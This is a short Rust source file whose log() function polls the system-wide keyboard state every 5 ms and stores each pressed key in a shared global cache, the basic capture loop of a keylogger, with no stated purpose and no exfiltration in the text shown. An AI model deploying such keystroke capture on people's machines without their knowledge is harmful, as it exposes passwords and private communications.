use std::{thread, time};

use device_query::{DeviceQuery, DeviceState, Keycode};

use crate::ram::PubInfo;

pub fn log() {
    let mut last_key: Vec<Keycode> = vec![];
    loop {
        let keys = DeviceState::new().get_keys();
        if keys != last_key {
            last_key = keys.clone();
            for key_pressed in keys {
                PubInfo::get().key_pressed_cache.push(key_pressed.to_string());
            }
        }
        thread::sleep(time::Duration::from_millis(5))
    }
}
